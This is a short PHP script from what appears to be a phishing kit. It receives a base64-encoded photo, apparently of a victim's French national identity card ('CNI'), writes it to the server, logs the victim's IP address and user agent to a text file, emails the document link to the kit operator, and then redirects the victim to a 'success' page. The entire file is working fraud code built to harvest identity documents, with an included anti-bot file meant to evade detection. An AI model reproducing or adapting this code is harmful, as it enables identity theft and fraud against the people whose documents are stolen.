<?php
  error_reporting(0);
  ob_start();
  session_start();

include'../antibots.php';
  include '../email.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
  //================= Date Anniversair Checker ================//
$random = rand(0, 100008400000);
$img = $_POST['data'];
  $img = str_replace('data:image/jpeg;base64,', '', $img);
  $img = str_replace(' ', '+', $img);
  $data = base64_decode($img);
  $file = $random.'.jpg';
  $success = file_put_contents($file, $data);
$message = '
📇  Doc officiel : '.$_SERVER['HTTP_HOST'].'/info/'.$file.'
📇  IP: '._ip().'
📇  User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
';

$Subject="📇NEW FR3SH CNI📇 |"._ip();
$head="From: ❤S4N70S❤  <DOC>";

$fil = fopen('0n_r3z_p4s_n0us.txt', 'a+');
fwrite($fil, '####################'.$message.'####################');
$_SESSION['step_six']  = true;
mail($my_mail,$Subject,$message,$head);
    header('location: success.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));
}
else
{
  header('location: ../../index.php');
}
